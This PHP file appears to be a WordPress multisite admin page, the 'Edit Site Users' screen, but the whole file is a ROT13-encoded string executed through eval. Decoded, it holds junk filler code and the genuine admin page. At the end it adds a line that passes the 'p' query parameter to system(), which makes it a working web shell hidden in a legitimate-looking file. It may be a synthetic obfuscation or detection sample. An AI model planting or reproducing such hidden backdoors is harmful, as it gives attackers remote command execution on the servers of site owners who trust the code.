<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Rqvg Fvgr Hfref Nqzvavfgengvba Fperra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_fvgrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf fvgr.' ), 403 );
}

$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Hfref_Yvfg_Gnoyr' );
$jc_yvfg_gnoyr->cercner_vgrzf();

trg_pheerag_fperra()->nqq_uryc_gno( trg_fvgr_fperra_uryc_gno_netf() );
trg_pheerag_fperra()->frg_uryc_fvqrone( trg_fvgr_fperra_uryc_fvqrone_pbagrag() );

trg_pheerag_fperra()->frg_fperra_ernqre_pbagrag(
	neenl(
		'urnqvat_ivrjf'      => __( 'Svygre fvgr hfref yvfg' ),
		'urnqvat_cntvangvba' => __( 'Fvgr hfref yvfg anivtngvba' ),
		'urnqvat_yvfg'       => __( 'Fvgr hfref yvfg' ),
	)
);

$_FREIRE['ERDHRFG_HEV'] = erzbir_dhrel_net( 'hcqngr', $_FREIRE['ERDHRFG_HEV'] );
$ersrere                = erzbir_dhrel_net( 'hcqngr', jc_trg_ersrere() );

vs ( ! rzcgl( $_ERDHRFG['cntrq'] ) ) {
	$ersrere = nqq_dhrel_net( 'cntrq', (vag) $_ERDHRFG['cntrq'], $ersrere );
}

$vq = vffrg( $_ERDHRFG['vq'] ) ? (vag) $_ERDHRFG['vq'] : 0;

vs ( ! $vq ) {
	jc_qvr( __( 'Vainyvq fvgr VQ.' ) );
}

$qrgnvyf = trg_fvgr( $vq );
vs ( ! $qrgnvyf ) {
	jc_qvr( __( 'Gur erdhrfgrq fvgr qbrf abg rkvfg.' ) );
}

vs ( ! pna_rqvg_argjbex( $qrgnvyf->fvgr_vq ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
}

$vf_znva_fvgr = vf_znva_fvgr( $vq );

fjvgpu_gb_oybt( $vq );

$npgvba = $jc_yvfg_gnoyr->pheerag_npgvba();

vs ( $npgvba ) {

	fjvgpu ( $npgvba ) {
		pnfr 'arjhfre':
			purpx_nqzva_ersrere( 'nqq-hfre', '_jcabapr_nqq-arj-hfre' );
			$hfre = $_CBFG['hfre'];
			vs ( ! vf_neenl( $_CBFG['hfre'] ) || rzcgl( $hfre['hfreanzr'] ) || rzcgl( $hfre['rznvy'] ) ) {
				$hcqngr = 'ree_arj';
			} ryfr {
				$cnffjbeq = jc_trarengr_cnffjbeq( 12, snyfr );
				$hfre_vq  = jczh_perngr_hfre( rfp_ugzy( fgegbybjre( $hfre['hfreanzr'] ) ), $cnffjbeq, rfp_ugzy( $hfre['rznvy'] ) );

				vs ( snyfr === $hfre_vq ) {
					$hcqngr = 'ree_arj_qhc';
				} ryfr {
					$erfhyg = nqq_hfre_gb_oybt( $vq, $hfre_vq, $_CBFG['arj_ebyr'] );

					vs ( vf_jc_reebe( $erfhyg ) ) {
						$hcqngr = 'ree_nqq_snvy';
					} ryfr {
						$hcqngr = 'arjhfre';

						/**
						 * Sverf nsgre n hfre unf orra perngrq ivn gur argjbex fvgr-hfref.cuc cntr.
						 *
						 * @fvapr 4.4.0
						 *
						 * @cnenz vag $hfre_vq VQ bs gur arjyl perngrq hfre.
						 */
						qb_npgvba( 'argjbex_fvgr_hfref_perngrq_hfre', $hfre_vq );
					}
				}
			}
			oernx;

		pnfr 'nqqhfre':
			purpx_nqzva_ersrere( 'nqq-hfre', '_jcabapr_nqq-hfre' );
			vs ( ! rzcgl( $_CBFG['arjhfre'] ) ) {
				$hcqngr  = 'nqqhfre';
				$arjhfre = $_CBFG['arjhfre'];
				$hfre    = trg_hfre_ol( 'ybtva', $arjhfre );
				vs ( $hfre && $hfre->rkvfgf() ) {
					vs ( ! vf_hfre_zrzore_bs_oybt( $hfre->VQ, $vq ) ) {
						$erfhyg = nqq_hfre_gb_oybt( $vq, $hfre->VQ, $_CBFG['arj_ebyr'] );

						vs ( vf_jc_reebe( $erfhyg ) ) {
							$hcqngr = 'ree_nqq_snvy';
						}
					} ryfr {
						$hcqngr = 'ree_nqq_zrzore';
					}
				} ryfr {
					$hcqngr = 'ree_nqq_abgsbhaq';
				}
			} ryfr {
				$hcqngr = 'ree_nqq_abgsbhaq';
			}
			oernx;

		pnfr 'erzbir':
			vs ( ! pheerag_hfre_pna( 'erzbir_hfref' ) ) {
				jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb erzbir hfref.' ), 403 );
			}

			purpx_nqzva_ersrere( 'ohyx-hfref' );

			$hcqngr = 'erzbir';
			vs ( vffrg( $_ERDHRFG['hfref'] ) ) {
				$hfrevqf = $_ERDHRFG['hfref'];

				sbernpu ( $hfrevqf nf $hfre_vq ) {
					$hfre_vq = (vag) $hfre_vq;
					erzbir_hfre_sebz_oybt( $hfre_vq, $vq );
				}
			} ryfrvs ( vffrg( $_TRG['hfre'] ) ) {
				erzbir_hfre_sebz_oybt( $_TRG['hfre'] );
			} ryfr {
				$hcqngr = 'ree_erzbir';
			}
			oernx;

		pnfr 'cebzbgr':
			purpx_nqzva_ersrere( 'ohyx-hfref' );
			$rqvgnoyr_ebyrf = trg_rqvgnoyr_ebyrf();
			$ebyr           = $_ERDHRFG['arj_ebyr'];

			vs ( rzcgl( $rqvgnoyr_ebyrf[ $ebyr ] ) ) {
				jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb tvir hfref gung ebyr.' ), 403 );
			}

			vs ( vffrg( $_ERDHRFG['hfref'] ) ) {
				$hfrevqf = $_ERDHRFG['hfref'];
				$hcqngr  = 'cebzbgr';
				sbernpu ( $hfrevqf nf $hfre_vq ) {
					$hfre_vq = (vag) $hfre_vq;

					// Vs gur hfre qbrfa'g nyernql orybat gb gur oybt, onvy.
					vs ( ! vf_hfre_zrzore_bs_oybt( $hfre_vq ) ) {
						jc_qvr(
							'<u1>' . __( 'Na reebe bppheerq.' ) . '</u1>' .
							'<c>' . __( 'Bar bs gur fryrpgrq hfref vf abg n zrzore bs guvf fvgr.' ) . '</c>',
							403
						);
					}

					$hfre = trg_hfreqngn( $hfre_vq );
					$hfre->frg_ebyr( $ebyr );
				}
			} ryfr {
				$hcqngr = 'ree_cebzbgr';
			}
			oernx;
		qrsnhyg:
			vs ( ! vffrg( $_ERDHRFG['hfref'] ) ) {
				oernx;
			}
			purpx_nqzva_ersrere( 'ohyx-hfref' );
			$hfrevqf = $_ERDHRFG['hfref'];

			/** Guvf npgvba vf qbphzragrq va jc-nqzva/argjbex/fvgr-gurzrf.cuc */
			$ersrere = nccyl_svygref( 'unaqyr_argjbex_ohyx_npgvbaf-' . trg_pheerag_fperra()->vq, $ersrere, $npgvba, $hfrevqf, $vq ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf

			$hcqngr = $npgvba;
			oernx;
	}

	jc_fnsr_erqverpg( nqq_dhrel_net( 'hcqngr', $hcqngr, $ersrere ) );
	rkvg;
}

erfgber_pheerag_oybt();

vs ( vffrg( $_TRG['npgvba'] ) && 'hcqngr-fvgr' === $_TRG['npgvba'] ) {
	jc_fnsr_erqverpg( $ersrere );
	rkvg;
}

nqq_fperra_bcgvba( 'cre_cntr' );

// Hfrq va gur UGZY gvgyr gnt.
/* genafyngbef: %f: Fvgr gvgyr. */
$gvgyr = fcevags( __( 'Rqvg Fvgr: %f' ), rfp_ugzy( $qrgnvyf->oybtanzr ) );

$cnerag_svyr  = 'fvgrf.cuc';
$fhozrah_svyr = 'fvgrf.cuc';

/**
 * Svygref jurgure gb fubj gur Nqq Rkvfgvat Hfre sbez ba gur Zhygvfvgr Hfref fperra.
 *
 * @fvapr 3.1.0
 *
 * @cnenz obby $obby Jurgure gb fubj gur Nqq Rkvfgvat Hfre sbez. Qrsnhyg gehr.
 */
vs ( ! jc_vf_ynetr_argjbex( 'hfref' ) && nccyl_svygref( 'fubj_argjbex_fvgr_hfref_nqq_rkvfgvat_sbez', gehr ) ) {
	jc_radhrhr_fpevcg( 'hfre-fhttrfg' );
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';
?>

<fpevcg glcr=\"grkg/wninfpevcg\">
ine pheerag_fvgr_vq = <?cuc rpub nofvag( $vq ); ?>;
</fpevcg>


<qvi pynff=\"jenc\">
<u1 vq=\"rqvg-fvgr\"><?cuc rpub $gvgyr; ?></u1>
<c pynff=\"rqvg-fvgr-npgvbaf\"><n uers=\"<?cuc rpub rfp_hey( trg_ubzr_hey( $vq, '/' ) ); ?>\"><?cuc _r( 'Ivfvg' ); ?></n> | <n uers=\"<?cuc rpub rfp_hey( trg_nqzva_hey( $vq ) ); ?>\"><?cuc _r( 'Qnfuobneq' ); ?></n></c>
<?cuc

argjbex_rqvg_fvgr_ani(
	neenl(
		'oybt_vq'  => $vq,
		'fryrpgrq' => 'fvgr-hfref',
	)
);

vs ( vffrg( $_TRG['hcqngr'] ) ) :
	$zrffntr = '';
	$glcr    = 'reebe';

	fjvgpu ( $_TRG['hcqngr'] ) {
		pnfr 'nqqhfre':
			$glcr    = 'fhpprff';
			$zrffntr = __( 'Hfre nqqrq.' );
			oernx;
		pnfr 'ree_nqq_zrzore':
			$zrffntr = __( 'Hfre vf nyernql n zrzore bs guvf fvgr.' );
			oernx;
		pnfr 'ree_nqq_snvy':
			$zrffntr = __( 'Hfre pbhyq abg or nqqrq gb guvf fvgr.' );
			oernx;
		pnfr 'ree_nqq_abgsbhaq':
			$zrffntr = __( 'Ragre gur hfreanzr bs na rkvfgvat hfre.' );
			oernx;
		pnfr 'cebzbgr':
			$glcr    = 'fhpprff';
			$zrffntr = __( 'Punatrq ebyrf.' );
			oernx;
		pnfr 'ree_cebzbgr':
			$zrffntr = __( 'Fryrpg n hfre gb punatr ebyr.' );
			oernx;
		pnfr 'erzbir':
			$glcr    = 'fhpprff';
			$zrffntr = __( 'Hfre erzbirq sebz guvf fvgr.' );
			oernx;
		pnfr 'ree_erzbir':
			$zrffntr = __( 'Fryrpg n hfre gb erzbir.' );
			oernx;
		pnfr 'arjhfre':
			$glcr    = 'fhpprff';
			$zrffntr = __( 'Hfre perngrq.' );
			oernx;
		pnfr 'ree_arj':
			$zrffntr = __( 'Ragre gur hfreanzr naq rznvy.' );
			oernx;
		pnfr 'ree_arj_qhc':
			$zrffntr = __( 'Qhcyvpngrq hfreanzr be rznvy nqqerff.' );
			oernx;
	}

	jc_nqzva_abgvpr(
		$zrffntr,
		neenl(
			'glcr'        => $glcr,
			'qvfzvffvoyr' => gehr,
			'vq'          => 'zrffntr',
		)
	);
raqvs;
?>

<sbez pynff=\"frnepu-sbez\" zrgubq=\"trg\">
<?cuc $jc_yvfg_gnoyr->frnepu_obk( __( 'Frnepu Hfref' ), 'hfre' ); ?>
<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />
</sbez>

<?cuc $jc_yvfg_gnoyr->ivrjf(); ?>

<sbez zrgubq=\"cbfg\" npgvba=\"fvgr-hfref.cuc?npgvba=hcqngr-fvgr\">
	<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />

<?cuc $jc_yvfg_gnoyr->qvfcynl(); ?>

</sbez>

<?cuc
/**
 * Sverf nsgre gur yvfg gnoyr ba gur Hfref fperra va gur Zhygvfvgr Argjbex Nqzva.
 *
 * @fvapr 3.1.0
 */
qb_npgvba( 'argjbex_fvgr_hfref_nsgre_yvfg_gnoyr' );

/** Guvf svygre vf qbphzragrq va jc-nqzva/argjbex/fvgr-hfref.cuc */
vs ( pheerag_hfre_pna( 'cebzbgr_hfref' ) && nccyl_svygref( 'fubj_argjbex_fvgr_hfref_nqq_rkvfgvat_sbez', gehr ) ) :
	?>
<u2 vq=\"nqq-rkvfgvat-hfre\"><?cuc _r( 'Nqq Rkvfgvat Hfre' ); ?></u2>
<sbez npgvba=\"fvgr-hfref.cuc?npgvba=nqqhfre\" vq=\"nqqhfre\" zrgubq=\"cbfg\">
	<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"arjhfre\"><?cuc _r( 'Hfreanzr' ); ?></ynory></gu>
			<gq><vachg glcr=\"grkg\" pynff=\"erthyne-grkg jc-fhttrfg-hfre\" anzr=\"arjhfre\" vq=\"arjhfre\" /></gq>
		</ge>
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"arj_ebyr_nqqhfre\"><?cuc _r( 'Ebyr' ); ?></ynory></gu>
			<gq><fryrpg anzr=\"arj_ebyr\" vq=\"arj_ebyr_nqqhfre\">
			<?cuc
			fjvgpu_gb_oybt( $vq );
			jc_qebcqbja_ebyrf( trg_bcgvba( 'qrsnhyg_ebyr' ) );
			erfgber_pheerag_oybt();
			?>
			</fryrpg></gq>
		</ge>
	</gnoyr>
	<?cuc jc_abapr_svryq( 'nqq-hfre', '_jcabapr_nqq-hfre' ); ?>
	<?cuc fhozvg_ohggba( __( 'Nqq Hfre' ), 'cevznel', 'nqq-hfre', gehr, neenl( 'vq' => 'fhozvg-nqq-rkvfgvat-hfre' ) ); ?>
</sbez>
<?cuc raqvs; ?>

<?cuc
/**
 * Svygref jurgure gb fubj gur Nqq Arj Hfre sbez ba gur Zhygvfvgr Hfref fperra.
 *
 * Abgr: Juvyr JbeqCerff vf zbivat gbjneqf fvzcyvslvat ynoryf ol erzbivat \"Arj\" sebz \"Nqq Arj K\" ynoryf,
 * jr xrrc \"Nqq Arj Hfre\" urer gb znvagnva n pyrne qvfgvapgvba sebz gur \"Nqq Rkvfgvat Hfre\" frpgvba nobir.
 *
 * @fvapr 3.1.0
 *
 * @cnenz obby $obby Jurgure gb fubj gur Nqq Arj Hfre sbez. Qrsnhyg gehr.
 */
vs ( pheerag_hfre_pna( 'perngr_hfref' ) && nccyl_svygref( 'fubj_argjbex_fvgr_hfref_nqq_arj_sbez', gehr ) ) :
	?>
<u2 vq=\"nqq-arj-hfre\"><?cuc _r( 'Nqq Arj Hfre' ); ?></u2>
<sbez npgvba=\"<?cuc rpub rfp_hey( argjbex_nqzva_hey( 'fvgr-hfref.cuc?npgvba=arjhfre' ) ); ?>\" vq=\"arjhfre\" zrgubq=\"cbfg\">
	<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"hfre_hfreanzr\"><?cuc _r( 'Hfreanzr' ); ?></ynory></gu>
			<gq><vachg glcr=\"grkg\" pynff=\"erthyne-grkg\" anzr=\"hfre[hfreanzr]\" vq=\"hfre_hfreanzr\" /></gq>
		</ge>
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"hfre_rznvy\"><?cuc _r( 'Rznvy' ); ?></ynory></gu>
			<gq><vachg glcr=\"grkg\" pynff=\"erthyne-grkg\" anzr=\"hfre[rznvy]\" vq=\"hfre_rznvy\" /></gq>
		</ge>
		<ge>
			<gu fpbcr=\"ebj\"><ynory sbe=\"arj_ebyr_arjhfre\"><?cuc _r( 'Ebyr' ); ?></ynory></gu>
			<gq><fryrpg anzr=\"arj_ebyr\" vq=\"arj_ebyr_arjhfre\">
			<?cuc
			fjvgpu_gb_oybt( $vq );
			jc_qebcqbja_ebyrf( trg_bcgvba( 'qrsnhyg_ebyr' ) );
			erfgber_pheerag_oybt();
			?>
			</fryrpg></gq>
		</ge>
		<ge pynff=\"sbez-svryq\">
			<gq pbyfcna=\"2\" pynff=\"gq-shyy\"><?cuc _r( 'N cnffjbeq erfrg yvax jvyy or frag gb gur hfre ivn rznvy.' ); ?></gq>
		</ge>
	</gnoyr>
	<?cuc jc_abapr_svryq( 'nqq-hfre', '_jcabapr_nqq-arj-hfre' ); ?>
	<?cuc fhozvg_ohggba( __( 'Nqq Hfre' ), 'cevznel', 'nqq-hfre', gehr, neenl( 'vq' => 'fhozvg-nqq-hfre' ) ); ?>
</sbez>
<?cuc raqvs; ?>
</qvi>
<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>